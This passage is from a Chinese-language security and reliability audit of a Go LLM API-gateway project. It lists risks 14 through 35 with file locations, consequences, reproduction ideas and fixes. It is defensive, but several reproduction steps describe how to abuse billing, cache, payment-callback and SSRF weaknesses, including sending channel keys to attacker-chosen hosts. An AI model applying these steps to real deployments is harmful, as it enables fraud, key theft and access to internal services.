- 可能后果：负数固定价格可能形成负 `summary.Quota`，后续结算若按差额退款/补扣处理，可能出现给用户加额或少扣费；极大值可能造成 int 溢出或异常高扣费；0 倍率可能让整组或单模型变成免费模型。即使属于管理员配置错误，也会直接转化为运营资金风险。
- 复现思路：本地通过管理员设置接口提交 `ModelPrice={"some-model":-1}` 或极大值，再走固定价格模型的预扣/实际扣费；观察 `QuotaToPreConsume`、`summary.Quota` 和最终用户额度变化。倍率类配置同理测试图片、音频和缓存 token。
- 修复建议：为所有计费 map 增加统一校验：必须是有限数值、非负或正数按业务决定、不得超过运营上限；固定价格和倍率 0 应要求显式免费模型白名单；`UpdateOption` 应先校验成功再写数据库，避免错误配置落库。同步价格导入也要复用同一校验。
- 优先级：P1
- 当前状态：已确认后端缺少统一边界校验，尚未修复。

### 风险 15：可用分组/自动分组配置解析失败时会先清空内存并保存坏配置，可能造成大面积分组不可用

- 标题：`UserUsableGroups` 和 `AutoGroups` 更新函数在 JSON 解析前先重置内存变量，通用设置入口又先写 DB 再刷新内存
- 影响范围：用户可选分组、token 固定分组、auto 分组、渠道选择、模型列表和价格展示
- 触发条件：管理员误提交非法 JSON、同步脚本写入异常格式，或前端校验被绕过直接调用通用设置接口
- 涉及文件/函数：
  - `controller/option.go:152-285`：通用设置更新入口未对 `UserUsableGroups`、`AutoGroups` 做显式预校验
  - `model/option.go:210-223`：`UpdateOption` 先 `DB.Save`，再调用 `updateOptionMap`
  - `model/option.go:396-397`：`AutoGroups` 刷新调用 `UpdateAutoGroupsByJsonString`
  - `model/option.go:542-543`：`UserUsableGroups` 刷新调用 `UpdateUserUsableGroupsByJSONString`
  - `setting/user_usable_group.go:38-43`：先把 `userUsableGroups` 置空，再 `json.Unmarshal`
  - `setting/auto_group.go:22-24`：先把 `autoGroups` 置空，再 `common.Unmarshal`
  - `middleware/auth.go:382-399`：token 固定分组依赖 `GetUserUsableGroups(userGroup)` 判权
  - `service/channel_select.go:89-94`：`auto` 分组依赖 `GetUserAutoGroup`
- 可能后果：一次错误配置即可让内存中的用户可选分组或自动分组变空；token 固定分组请求可能被拒绝，`auto` 分组可能无法选渠道。由于坏值已经落库，下一次配置同步或重启后仍可能持续故障。
- 复现思路：本地调用设置接口提交 `UserUsableGroups="{bad"` 或 `AutoGroups="{bad"`；观察接口返回错误后内存分组是否已经被清空，数据库 option 是否保存了坏值，后续 token 固定分组和 auto 分组请求是否失败。
- 修复建议：所有配置更新先解析到临时变量并通过完整业务校验后再替换内存；`UpdateOption` 应在校验成功后才写 DB。对 `UserUsableGroups`/`AutoGroups` 增加“组名必须存在于 GroupRatio 或允许 auto”的校验和回滚测试。
- 优先级：P1
- 当前状态：已确认代码路径存在先清空/先落库风险，尚未修复。

### 风险 16：多项渠道破坏性操作缺少二次安全验证和审计日志

- 标题：删除/禁用渠道、按 tag 批量禁用、批量删除、多密钥删除/全禁用等操作只有 AdminAuth，没有复用密钥查看接口的安全验证和日志
- 影响范围：渠道可用性、渠道密钥、自动禁用状态、批量运营操作、事后追责
- 触发条件：管理员账号被盗、管理员误操作、浏览器会话被滥用，或内部工具误调用批量接口
- 涉及文件/函数：
  - `router/api-router.go:233-270`：渠道管理路由整体使用 `AdminAuth`；只有 `POST /:id/key` 额外使用 `RootAuth`、`CriticalRateLimit`、`DisableCache`、`SecureVerificationRequired`
  - `controller/channel.go:703-715`：`DeleteDisabledChannel` 可删除所有 disabled 渠道
  - `controller/channel.go:730-750`：`DisableTagChannels` 可按 tag 批量禁用渠道
  - `router/api-router.go:252-253`：单渠道删除和批量删除路由没有二次安全验证
  - `controller/channel.go:1262-1718`：`ManageMultiKeys` 支持禁用、启用、删除单个 key、全禁用和删除自动禁用 key
  - `controller/channel.go:405-427`：查看渠道密钥已有安全验证依赖和 `RecordLog`，说明项目已有更高风险操作的保护模式
- 可能后果：一个普通管理员权限即可批量下线渠道或删除多 key 中的真实密钥，导致大面积请求失败、渠道成本切换异常或密钥资产丢失；缺少操作者、IP、请求参数、旧值/新值日志会显著增加事故追踪难度。
- 复现思路：使用管理员会话调用 `/api/channel/tag/disabled`、`/api/channel/batch`、`/api/channel/multi_key/manage` 的 `delete_key`/`disable_all_keys`，确认不需要安全验证 token，也没有类似“查看渠道密钥信息”的审计日志。
- 修复建议：破坏性渠道操作统一加 `CriticalRateLimit`、`SecureVerificationRequired`，高风险操作提升到 `RootAuth` 或增加独立权限；所有批量和密钥修改记录管理员 ID、IP、channel id/tag、action、key index、影响数量和旧值摘要。
- 优先级：P1
- 当前状态：已确认路由和控制器缺少二次验证/审计，尚未修复。

### 风险 19：用户更新缓存写入旧对象，管理员改分组或启用用户后 Redis 可能保留旧状态

- 标题：`User.Update`/`User.Edit` 在更新 DB 后调用 `updateUserCache(*user)`，但 `user` 已被重新加载为更新前状态
- 影响范围：管理员修改用户分组、启用用户、编辑用户资料、用户自助更新资料、Redis 用户缓存、token 分组判权
- 触发条件：Redis 用户缓存启用；管理员通过 `UpdateUser` 修改用户分组或通过 `ManageUser` 启用用户；或用户自助更新资料/设置触发 `User.Update`
- 涉及文件/函数：
  - `controller/user.go:578-617`：管理员 `UpdateUser` 可编辑用户分组等字段
  - `controller/user.go:916-917`：`ManageUser` 的 `enable` 分支设置 `user.Status=enabled`
  - `controller/user.go:1004-1019`：`enable` 后没有像 `disable/promote/demote` 一样主动失效用户/token 缓存
  - `model/user.go:620-635`：`User.Update` 先保存 `newUser`，再 `DB.First(&user, user.Id)`，更新 DB 后写入 `updateUserCache(*user)`
  - `model/user.go:638-664`：`User.Edit` 同样在更新后写入重新加载的旧 `user`
  - `model/user_cache.go:79-118`：`GetUserCache` 后续会优先读取 Redis 用户缓存
  - `middleware/auth.go:367-380`：token 请求依赖 `GetUserCache` 判断用户状态
- 可能后果：管理员把用户从高价/高权限分组降到低价分组后，Redis 中仍可能保留旧分组，用户在 TTL 内继续按旧分组选渠道和计费；管理员启用用户后，缓存也可能继续保留 disabled 状态，导致用户短时无法使用。禁用分支有额外失效缓存，风险主要集中在启用、分组/资料编辑和自助设置。
- 复现思路：启用 Redis，先让用户产生缓存；管理员修改用户分组或启用用户；立即发起 token 请求，观察 `ContextKeyUserGroup`/状态是否仍来自旧缓存。
- 修复建议：`User.Update`/`User.Edit` 应在 DB 更新成功后重新读取新值，或直接用 `newUser` 补齐完整字段后写缓存；所有会改变状态、分组、设置、额度的管理操作统一调用明确的 cache set/invalidate 方法。补充 Redis 开启下的分组变更和 enable 测试。
- 优先级：P1
- 当前状态：已确认缓存写入对象存在旧值风险，尚未修复。

### 风险 20：管理员硬删除用户不清理用户和 token 缓存，已缓存 token 可能在 TTL 内继续通过认证

- 标题：`DELETE /api/user/:id` 走 `HardDeleteUserById`，没有像软删除路径那样清理 Redis 用户缓存和 token 缓存
- 影响范围：管理员删除用户、API token 认证、Redis 缓存、离职/封禁场景
- 触发条件：Redis 启用；被删除用户和 token 已经被缓存；管理员调用硬删除接口删除用户
- 涉及文件/函数：
  - `router/api-router.go:128-148`：管理员用户路由暴露 `DELETE /:id`
  - `controller/user.go:791-815`：`DeleteUser` 校验角色后直接调用 `model.HardDeleteUserById`
  - `model/user.go:447-452`：`HardDeleteUserById` 只执行 `DB.Unscoped().Delete`
  - `model/user.go:698-707`：软删除 `user.Delete()` 会清理用户缓存
  - `controller/user.go:918-934`：`ManageUser` 的 delete 分支会额外清理 token 缓存
  - `middleware/auth.go:332-380`：token 认证可从 Redis token 和 Redis user cache 读取身份与状态
- 可能后果：硬删除用户后，如果 Redis 中仍有该用户和 token 的缓存，API token 可能在缓存 TTL 内继续通过 `TokenAuth`，形成“删除后仍可调用”的窗口；若缓存缺失则可能变成数据库错误而非明确禁用，行为也不稳定。
- 复现思路：启用 Redis，用某用户 token 成功请求一次以写入 token/user cache；管理员调用 `DELETE /api/user/:id`；在缓存 TTL 内继续用原 token 请求 relay，观察是否仍通过认证。
- 修复建议：硬删除前后统一调用 `InvalidateUserCache` 和 `InvalidateUserTokensCache`；同时考虑删除或禁用该用户所有 token。保留一个软删除/禁用优先的运营流程，硬删除只用于数据清理并要求二次确认。
- 优先级：P1
- 当前状态：已确认硬删除路径缺少缓存失效，尚未修复。

### 风险 21：后台补单和订阅手工操作缺少二次安全验证，部分操作缺少管理员维度审计

- 标题：手工补单、订阅绑定/作废/删除等资产操作只挂 `AdminAuth`，没有复用高风险操作的安全验证和完整审计
- 影响范围：充值补单、用户套餐、套餐升级分组、用户余额、客服/运营后台操作、事后追责
- 触发条件：管理员账号被盗、管理员误操作、内部工具误调用，或普通管理员执行大额补单/套餐绑定/删除订阅
- 涉及文件/函数：
  - `router/api-router.go:128-148`：用户后台路由整体使用 `AdminAuth`，`POST /user/topup/complete` 没有 `SecureVerificationRequired`
  - `controller/topup.go:509-525`：`AdminCompleteTopUp` 只接收 `trade_no`，无二次确认字段、无原因字段
  - `model/topup.go:432-517`：`ManualCompleteTopUp` 会给用户加额并记录 topup 日志，但日志只带 caller IP 和 `"admin"`，没有管理员 ID/用户名
  - `router/api-router.go:168-182`：订阅后台路由整体使用 `AdminAuth`
  - `controller/subscription.go:336-355`、`controller/subscription.go:379-404`：管理员可直接绑定套餐
  - `controller/subscription.go:406-442`：管理员可作废或删除用户订阅
  - `model/subscription.go:832-916`：作废/删除订阅会改状态、删除记录和回退用户组，但没有记录管理员 ID、原因、旧值/新值
- 可能后果：一个管理员会话即可触发补单入账、套餐发放、套餐作废或删除；如果缺少管理员 ID、原因和旧值/新值，事后难以区分误操作、恶意操作和业务操作。订阅删除还会影响用户组回退，造成权限/计费分组异常。
- 复现思路：使用管理员会话调用 `/api/user/topup/complete`、`/api/subscription/admin/bind`、`/api/subscription/admin/user_subscriptions/:id/invalidate`；确认不需要额外安全验证，检查日志是否能定位具体管理员和操作原因。
- 修复建议：资产变更类后台操作统一加 `CriticalRateLimit`、`SecureVerificationRequired`，大额补单/套餐删除建议提升到 `RootAuth` 或独立权限；请求体增加 reason/confirmation；日志记录管理员 ID、用户名、IP、目标用户、订单/订阅 ID、旧值/新值和影响额度。
- 优先级：P1
- 当前状态：已确认多条后台资产操作缺少二次安全验证或完整审计，尚未修复。

### 风险 22：分层配置更新通用反射解析会吞掉解析错误，且 `UpdateOption` 先落库后刷新内存

- 标题：`billing_setting.*`、`checkin_setting.*`、`token_setting.*`、`payment_setting.*` 等分层配置没有统一业务校验，非法值可能落库并导致 DB/内存状态不一致
- 影响范围：签到奖励、token 数量上限、支付金额选项/折扣、分层计费表达式、性能/监控配置、运营后台设置
- 触发条件：管理员提交非法 JSON、非法数字、负数、极大值，或前端校验被绕过直接调用设置接口
- 涉及文件/函数：
  - `model/option.go:210-223`：`UpdateOption` 先 `DB.Save`，再调用 `updateOptionMap`
  - `model/option.go:259-267`：`updateOptionMap` 先写 `OptionMap`，再进入分层配置处理
  - `model/option.go:588-622`：`handleConfigUpdate` 调用 `config.UpdateConfigFromMap` 后无错误检查，始终返回 true
  - `setting/config/config.go:203-269`：反射更新配置时 `ParseBool`、`ParseInt`、`ParseFloat`、`json.Unmarshal` 失败均 `continue`，最终返回 nil
  - `setting/operation_setting/checkin_setting.go:5-10`、`setting/operation_setting/token_setting.go:5-8`、`setting/operation_setting/payment_setting.go:5-13`、`setting/billing_setting/tiered_billing.go:18-23`：这些配置直接影响额度、支付和计费
- 可能后果：接口可能返回成功或只在内存中保持旧值，但数据库已经保存坏值；重启或定时加载时继续吞掉错误，形成“界面显示坏值、运行使用旧值/部分新值”的状态漂移。对支付、签到、计费等配置，这会造成运营排障困难和账务风险。
- 复现思路：本地提交 `checkin_setting.min_quota=abc`、`billing_setting.billing_expr={bad` 或 `payment_setting.amount_discount={bad`；观察 options 表已经保存坏值，而内存配置可能继续使用旧值，接口不一定报告具体解析失败。
- 修复建议：分层配置更新必须先解析到临时对象并返回错误，业务校验通过后才写 DB 和替换内存；`UpdateOption` 改为“validate -> persist -> apply”，失败时不得污染 `OptionMap` 和 DB。为每个分层配置模块提供 `Validate()`。
- 优先级：P1
- 当前状态：已确认通用配置更新存在吞错和先落库行为，尚未修复。

### 风险 23：签到奖励配置缺少非负和上限校验，MySQL/PostgreSQL 下负数签到会扣减用户余额

- 标题：`checkin_setting.min_quota/max_quota` 可被配置为负数或极大值，事务路径直接 `quota + quotaAwarded`
- 影响范围：每日签到、用户余额、活动运营、Redis 额度缓存
- 触发条件：管理员误配 `checkin_setting.min_quota` 为负数，或配置极大 `max_quota/min_quota`；签到功能开启
- 涉及文件/函数：
  - `setting/operation_setting/checkin_setting.go:5-16`：签到配置只有结构体字段，没有边界校验
  - `model/checkin.go:55-74`：奖励额度取 `MinQuota`，仅当 `MaxQuota > MinQuota` 时随机
  - `model/checkin.go:95-119`：MySQL/PostgreSQL 事务路径直接 `Update("quota", gorm.Expr("quota + ?", quotaAwarded))`
  - `model/checkin.go:124-138`：SQLite 路径走 `IncreaseUserQuota`，负数会被拒绝，和事务路径行为不一致
  - `model/option.go:588-622`、`setting/config/config.go:203-269`：分层配置更新没有非负/上限校验
- 可能后果：在 MySQL/PostgreSQL 环境中，用户签到可能被扣余额而不是加余额；极大配置会每天发放异常高额度，直接造成运营成本损失。不同数据库路径行为不一致也会让测试和生产结果偏离。
- 复现思路：本地将 `checkin_setting.enabled=true`、`checkin_setting.min_quota=-1000`、`checkin_setting.max_quota=-1`，在 MySQL/PostgreSQL 路径调用签到；观察 `users.quota` 是否减少。
- 修复建议：后端强制 `0 <= min_quota <= max_quota <= 单日奖励上限`；事务路径也应复用 `IncreaseUserQuota` 或同等非负校验；配置保存时拒绝非法值，并补充 MySQL/PostgreSQL 与 SQLite 行为一致性测试。
- 优先级：P1
- 当前状态：已确认负数配置可进入事务加额表达式，尚未修复。

### 风险 24：分层计费表达式后端保存时不做 smoke test，负数/异常表达式可造成 0 预扣、负扣费或回退到预估价

- 标题：`billing_setting.billing_mode/billing_expr` 通过通用分层配置直接保存，未在后端更新时执行 `SmokeTestExpr`
- 影响范围：tiered_expr 模型计费、预扣费、实际结算、渠道成本和模型价格同步
- 触发条件：管理员或价格同步写入异常表达式、负数表达式、极小/极大表达式，或表达式仅在特定请求体/header 下返回异常值
- 涉及文件/函数：
  - `setting/billing_setting/tiered_billing.go:18-23`：分层计费配置为 `BillingMode` 和 `BillingExpr` map
  - `setting/billing_setting/tiered_billing.go:73-106`：存在 `SmokeTestExpr`，可检查表达式运行失败和负数结果
  - `model/option.go:588-622`：`billing_setting.*` 由 `handleConfigUpdate` 直接更新，未调用 `SmokeTestExpr`
  - `setting/config/config.go:255-263`：map 字段只做 JSON 反序列化，不做业务校验
  - `relay/helper/price.go:257-268`：预扣时直接运行表达式并计算 `preConsumedQuota`
  - `pkg/billingexpr/settle.go:19-34`：实际结算直接把表达式结果换算为 `ActualQuotaAfterGroup`
  - `service/tiered_settle.go:106-115`：实际结算表达式出错时回退到预扣或预估额度
- 可能后果：负数表达式可能产生负预扣/负实际扣费，进而触发余额增加或少扣；异常表达式可能让实际结算回退到预估额度，造成高消耗请求按低预估结算；极大表达式可能导致异常高扣费或整数边界问题。
- 复现思路：本地把某模型设置为 `tiered_expr`，写入返回负数或按 header 分支返回异常的表达式；发起该模型请求，观察预扣、实际结算和用户余额变化。
- 修复建议：保存 `billing_setting.billing_expr` 前对所有启用 `tiered_expr` 的模型执行 `SmokeTestExpr`，并增加业务上限、有限数值检查和请求上下文样本；运行时对 `ActualQuotaAfterGroup < 0`、异常大值和表达式错误改为拒绝结算并告警，而不是静默回退。
- 优先级：P1
- 当前状态：已确认后端保存路径未执行表达式校验，尚未修复。

### 风险 26：批量更新队列先清空内存再落库，DB 失败或进程退出会永久丢失额度/统计增量

- 标题：`BATCH_UPDATE_ENABLED=true` 时，用户余额、token 余额、用户用量、渠道用量和请求次数增量没有持久化队列或失败重试
- 影响范围：用户余额、token `remain_quota/used_quota`、用户 `used_quota/request_count`、渠道 `used_quota`、运营账务统计
- 触发条件：开启 `BATCH_UPDATE_ENABLED` 后，进程在批量 flush 前退出/崩溃，或 flush 期间 DB 写入失败、连接闪断、字段溢出、死锁
- 涉及文件/函数：
  - `main.go:142-145`：环境变量开启批量更新后启动后台 goroutine
  - `model/utils.go:33-39`：`InitBatchUpdater` 固定间隔执行 `batchUpdate`，没有启动恢复、退出 flush 或 durable queue
  - `model/utils.go:42-49`：`addNewRecord` 只累加到进程内 `map[int]int`
  - `model/utils.go:69-75`：`batchUpdate` 把全局 map 移到局部变量并立即清空全局队列
  - `model/utils.go:84-90`、`model/user.go:1118-1127`、`model/channel.go:863-867`：落库失败只写日志，不回滚到队列、不重试、不告警升级
  - `model/user.go:1019-1021`、`model/user.go:1044-1046`、`model/user.go:1086-1090`、`model/token.go:387-389`、`model/token.go:417-419`、`model/channel.go:855-858`：资产/统计变更进入批量队列后立即向调用方返回成功
- 可能后果：扣费增量丢失会让用户或 token 少扣、渠道成本少记；退款/加额增量丢失会让用户少到账；用量和请求次数丢失会让运营报表与真实请求不一致。由于调用方已经认为扣费/加额成功，后续没有自动补偿来源，属于账务不可逆漂移。
- 复现思路：本地开启 `BATCH_UPDATE_ENABLED=true`，发起扣费或加额请求后在 `BatchUpdateInterval` 内杀进程，或临时断开 DB 让 `batchUpdate` 写失败；重启后比较 `logs.quota`、`users.quota/used_quota`、`tokens.remain_quota/used_quota`、`channels.used_quota` 的差异。
- 修复建议：批量更新应使用可恢复的持久化队列或 outbox 表；flush 成功后再删除队列记录；失败时保留并指数退避重试；进程 shutdown 执行同步 flush；对连续失败发告警并自动降级为同步写。资产类扣费建议优先保持同步事务或条件更新。
- 优先级：P1
- 当前状态：已确认批量队列为进程内 map，失败后只打日志，尚未修复。

### 风险 27：Redis 余额缓存先异步更新，DB 批量落库后置，缓存与主库可能长时间分叉

- 标题：余额/令牌余额函数先异步改 Redis，再进入批量队列或 DB 写入，缺少 DB 成功后的缓存确认和失败回滚
- 影响范围：用户余额展示、token 可用额度、实时扣费判断、重启后的余额恢复、客服排障
- 触发条件：Redis 更新成功但 DB 队列丢失/落库失败；Redis 更新失败但 DB 成功；异步 goroutine 执行顺序与请求返回顺序不同；批量队列在多实例间各自独立
- 涉及文件/函数：
  - `model/user.go:1009-1023`：`IncreaseUserQuota` 先异步 `cacheIncrUserQuota`，再入批量队列或 DB
  - `model/user.go:1034-1048`：`DecreaseUserQuota` 先异步 `cacheDecrUserQuota`，再入批量队列或 DB
  - `model/token.go:375-391`：`IncreaseTokenQuota` 先异步增加 token Redis 额度，再入队/落库
  - `model/token.go:405-421`：`DecreaseTokenQuota` 先异步扣 Redis 额度，再入队/落库
  - `model/user.go:1108-1110`：批量更新用户主表后没有主动失效用户缓存
- 可能后果：Redis 中显示和校验的余额与数据库长期不一致。典型场景是 Redis 已扣、DB 未扣，用户重启或缓存失效后余额“回弹”；或 Redis 未加、DB 已加，用户短期无法使用已充值额度。多实例部署时，每个实例的内存批量队列独立，进一步扩大不一致窗口。
- 复现思路：开启 Redis 和批量更新，构造一次扣费后让 DB flush 失败；检查 Redis 余额是否已变更而 DB 未变。反向场景可临时让 Redis 命令失败、DB 正常，比较接口余额、数据库余额和 token 可用额度。
- 修复建议：资产类变更以 DB 条件更新成功为准，再同步刷新/删除缓存；批量模式也应在 flush 成功后刷新缓存，失败时不得让 Redis 成为唯一事实来源。可增加余额版本号或 ledger 表，让缓存按版本重建。
- 优先级：P1
- 当前状态：已确认缓存更新和 DB 落库没有事务性约束，尚未修复。

### 风险 28：用户、token、日志和导出统计的额度字段大量使用 `int`/数据库 `int`，极端配置或充值可能溢出

- 标题：资产和统计字段缺少统一 `int64`/decimal 上限模型，多个路径把 decimal/float/int64 结果转为 `int`
- 影响范围：用户余额、token 余额、兑换码额度、日志扣费、quota_data 导出统计、请求次数、邀请返利
- 触发条件：管理员设置极大 `QuotaPerUnit`、极大兑换码额度、极大充值金额、极端模型倍率/固定价格/tiered_expr，或导入历史大额用户数据
- 涉及文件/函数：
  - `model/user.go:100-107`：`Quota`、`UsedQuota`、`RequestCount`、`AffQuota`、`AffHistoryQuota` 为 Go `int` 且 GORM `type:int`
  - `model/token.go:23-28`：`RemainQuota`、`UsedQuota` 为 `int`
  - `model/redemption.go:26`：兑换码 `Quota` 为 `int`
  - `model/log.go:43-46`、`model/log.go:265-277`：日志 `Quota`、tokens、耗时为 `int`
  - `model/usedata.go:19-21`：导出统计 `TokenUsed`、`Count`、`Quota` 为 `int`
  - `model/topup.go:227`、`model/topup.go:469-474`、`model/topup.go:556`、`model/topup.go:640-642`、`model/topup.go:714`：充值额度多处从 decimal/int64 转成 `int`
  - `service/quota.go:53-86`、`service/text_quota.go:290-300`、`service/task_billing.go:297`、`service/tool_billing.go:52-73`：计费结果多处转 `int`
- 可能后果：在 32 位或数据库 `INT` 上限环境中，超大额度可能写入失败、截断、变负或回绕；批量更新失败又会触发风险 26 的丢账。即使 Go 运行在 64 位，数据库 `type:int` 仍可能限制到 32 位，造成本地计算成功但落库异常。
- 复现思路：本地把 `QuotaPerUnit`、兑换码额度或模型固定价格配置到接近/超过 2,147,483,647 的结果，尝试充值、兑换和调用模型；观察 Go 层额度、DB 字段值、日志表和批量更新错误。
- 修复建议：资产和统计字段统一迁移到 `bigint`/`int64`，支付金额继续用 decimal；所有入口增加业务上限和有限数值检查；任何 `decimal -> int`、`float -> int` 前必须检查范围和非负；批量更新表达式也要带边界保护。
- 优先级：P1
- 当前状态：已确认多处核心字段和转换缺少上限模型，尚未修复。

### 风险 29：消费日志、主表统计和 `quota_data` 导出统计分三套异步路径，任一失败都会造成报表不可对账

- 标题：`logs`、`users/tokens/channels` 和 `quota_data` 分别写入，缺少同一个 request/ledger 的最终一致性校验
- 影响范围：用户账单、管理员日志、渠道成本、数据看板、财务对账、异常扣费追踪
- 触发条件：消费日志写入失败但扣费成功；扣费/统计批量更新失败但日志成功；`DataExportEnabled` 的内存缓存保存失败；进程在导出缓存 flush 前退出
- 涉及文件/函数：
  - `model/log.go:280-325`：`RecordConsumeLog` 单独写 `LOG_DB.Create`，失败只记录错误，不影响扣费状态
  - `model/log.go:326-329`：`quota_data` 统计通过 goroutine 异步写入内存缓存
  - `model/usedata.go:34-65`：`CacheQuotaData` 只存在于进程内
  - `model/usedata.go:67-89`：保存 `quota_data` 后无论单条 `Create` 是否失败都会清空缓存并打印成功
  - `model/usedata.go:92-101`：`increaseQuotaData` 失败只打日志
  - `model/log.go:515-568`：部分统计直接从 `logs` 汇总，和主表 `used_quota`、`quota_data` 不是同一个事实来源
- 可能后果：用户余额扣了但消费日志缺失，客服无法解释；消费日志存在但主表 `used_quota` 没加，用户总用量偏低；`quota_data` 看板丢失部分数据但日志仍存在，运营误判模型成本或用户消费。三套数据没有 request_id 级别对账任务时，问题会长期隐蔽。
- 复现思路：本地让 `LOG_DB` 暂时不可写但主库可写，或让 `quota_data` 保存失败；发起一次调用后比较 `logs`、`users.used_quota`、`tokens.used_quota`、`channels.used_quota`、`quota_data` 是否一致。
- 修复建议：建立统一消费 ledger/outbox，扣费、日志和统计都从 ledger 派生；日志写失败要有补偿队列；`quota_data` 缓存保存应按条确认，失败条目保留重试；增加每日对账任务，用 `request_id` 或 ledger id 比较日志、用户、token、渠道和看板统计。
- 优先级：P1
- 当前状态：已确认三套路径互不保证一致，尚未修复。

### 风险 33：Stripe/Epay 部分下单流程先创建第三方支付会话再写本地订单，DB 插入失败会产生无法自动入账的孤儿支付

- 标题：外部支付单已创建但本地 `top_ups`/`subscription_orders` 插入失败时，后续 webhook 找不到订单，只能人工处理
- 影响范围：Stripe 余额充值、Stripe 订阅购买、Epay 余额充值、支付客服工单、订单对账
- 触发条件：第三方创建支付会话成功后，本地 DB 插入失败、唯一键冲突、连接中断、进程崩溃；用户继续完成支付，支付网关正常回调
- 涉及文件/函数：
  - `controller/topup_stripe.go:92-112`：先 `genStripeLink`，后创建 `TopUp`
  - `controller/subscription_payment_stripe.go:71-91`：先 `genStripeSubscriptionLink`，后创建 `SubscriptionOrder`
  - `controller/topup.go:228-258`：Epay 余额充值先 `client.Purchase`，后创建 `TopUp`
  - `controller/topup.go:376-379`、`controller/topup_stripe.go:281-284`、`model/topup.go:205-208`：回调找不到本地订单时只报错/忽略，无法自动根据第三方订单重建本地订单
  - 对比：`controller/topup_creem.go:107-126`、`controller/topup_waffo.go:208-269`、`controller/topup_waffo_pancake.go:383-401`、`controller/subscription_payment_creem.go:80-114`、`controller/subscription_payment_waffo_pancake.go:74-91` 多数是先写本地订单再创建第三方会话
- 可能后果：用户真实付款后，本地没有 pending 订单可完成，自动入账失败；支付侧仍认为订单成功，系统侧没有可幂等补偿的本地状态，运营只能查第三方流水手动补单。若手动补单又套用错误额度计算，还会叠加风险 1/21。
- 复现思路：在 Stripe/Epay 下单时让第三方创建返回成功后模拟 DB `Create` 失败；保留支付链接并触发 webhook，观察本地找不到订单且无法自动入账。
- 修复建议：统一改为先创建本地 pending 订单，再用本地 `trade_no` 创建第三方会话；如果第三方创建失败，把本地订单标记 failed/expired。对历史孤儿支付增加第三方订单拉取和人工核对导入工具，必须记录实付金额、币种、第三方交易号和管理员原因。
- 优先级：P1
- 当前状态：已确认 Stripe/Epay 部分路径存在外部会话先于本地订单的顺序，尚未修复。

### 风险 34：订阅 Epay 的浏览器 return 和异步 notify 都会尝试完成订单，行锁无效时可能双创建订阅

- 标题：同一 Epay 订阅订单可由支付网关 notify 和用户浏览器 return 两条入口完成
- 影响范围：Epay 订阅购买、用户订阅记录、用户分组升级、累计充值金额、订阅 topup 镜像记录
- 触发条件：用户支付完成后浏览器同步跳回，同时支付网关异步通知到达；多实例部署；`CompleteSubscriptionOrder` 的旧式行锁实际不生效
- 涉及文件/函数：
  - `controller/subscription_payment_epay.go:110-160`：`SubscriptionEpayNotify` 验签成功后完成订单
  - `controller/subscription_payment_epay.go:163-211`：`SubscriptionEpayReturn` 也验签并完成订单
  - `controller/subscription_payment_epay.go:152-153`、`controller/subscription_payment_epay.go:202-203`：两条入口只共享进程内 `LockOrder`
  - `model/subscription.go:625-664`：`CompleteSubscriptionOrder` 依赖疑似无效的 `FOR UPDATE`，先 `CreateUserSubscriptionFromPlanTx` 和 `upsertSubscriptionTopUpTx`，再把订单标记 success
- 可能后果：notify 和 return 并发时可能都读到订单 pending，各自创建一个用户订阅并执行分组升级/日志/topup 镜像，导致套餐叠加和累计金额异常。即使其中一个后续保存订单失败，前面的订阅创建副作用也可能已经发生在同一事务里等待提交。
- 复现思路：用同一 Epay 订阅回调参数并发访问 `/api/subscription/epay/notify` 和 return 路由；在 MySQL/PostgreSQL 下检查 `user_subscriptions` 是否可能出现两条同订单来源记录。
- 修复建议：完成订阅订单前先用有效条件更新抢占 `status=pending`，抢占成功后再创建订阅；或在 `user_subscriptions` 增加 `source_order_trade_no` 唯一键，确保同一支付订单只能派生一个订阅。return 入口建议只查询状态并提示，不直接完成资产发放。
- 优先级：P1
- 当前状态：已确认双入口存在，风险依赖行锁无效或多实例并发，尚未修复。

### 风险 35：后台拉取模型/Discovery 的 HTTP 请求没有统一走 SSRF 防护，管理员可触达内网或任意地址

- 标题：`/api/channel/fetch_models/:id`、`/api/channel/fetch_models` 和 Custom OAuth Discovery 使用直接 HTTP client 或只校验重定向，初始 URL 没有统一 `ValidateURLWithFetchSetting`
- 影响范围：后台渠道模型拉取、渠道上游模型自动检测、Root 自定义 OAuth Discovery、内网服务、云元数据地址、上游 API key 泄露面
- 触发条件：管理员创建/修改渠道 `base_url` 指向内网或攻击者域名后触发模型拉取；Root 在 Discovery 输入任意 URL；渠道配置了代理或特殊 baseURL；攻击者拿到管理员会话
- 涉及文件/函数：
  - `router/api-router.go:255-256`：`GET /channel/fetch_models/:id` 为 `AdminAuth`，`POST /channel/fetch_models` 为 `RootAuth`
  - `controller/channel.go:994-1071`：`FetchModels` 接收任意 `base_url`，普通分支直接 `&http.Client{}` 请求 `${baseURL}/v1/models`
  - `controller/channel_upstream_update.go:262-329`：`fetchChannelUpstreamModelIDs` 使用渠道 `baseURL` 拼接模型接口，然后调用 `GetResponseBody`
  - `controller/channel-billing.go:139-151`：`GetResponseBody` 创建请求后直接 `client.Do`，没有对初始 URL 调 `ValidateURLWithFetchSetting`
  - `service/http_client.go:24-33`、`service/http_client.go:86-165`：`NewProxyHttpClient` 只在 redirect 时校验 URL，初始请求不校验；配置 proxy 时同样缺少 proxy 地址策略校验
  - `controller/custom_oauth.go:157-180`：Root-only Discovery 仅检查 http/https 和 Host，直接 `http.Client{Timeout: 20s}` 请求
  - 对比证据：`service/download.go:61-64`、`service/webhook.go:91-95`、`service/user_notify.go:156-159` 等路径会显式调用 SSRF 校验
- 可能后果：管理员级账号可让服务端请求 `127.0.0.1`、内网管理面、云元数据地址或任意外部地址；模型拉取还会携带渠道 Authorization/HeaderOverride，可能把上游 key 发给攻击者域名。该风险不一定需要普通用户权限，但对运营后台和密钥资产影响大。
- 复现思路：本地创建一个渠道，`base_url` 指向受控 HTTP 服务或内网地址，调用 `/api/channel/fetch_models/:id`；观察服务端是否发出请求且带 Authorization。再对 `/api/channel/fetch_models` 传入任意 `base_url` 验证是否绕过 `fetch_setting`。
- 修复建议：所有后台出站 HTTP 入口统一在请求前调用 `ValidateURLWithFetchSetting`，并把校验放入 `GetResponseBody`/`NewProxyHttpClient` 的初始请求路径；渠道 `base_url` 和 `proxy` 保存时也要校验；对模型拉取禁止私网地址、云元数据地址和非标准端口，除非 Root 显式授权并审计。
- 优先级：P1
- 当前状态：已确认多条后台 HTTP 拉取路径没有统一初始 URL SSRF 校验，尚未修复。

### 风险 36：支付 webhook 和支付请求日志记录完整 body/signature，且订阅订单持久化完整 provider payload

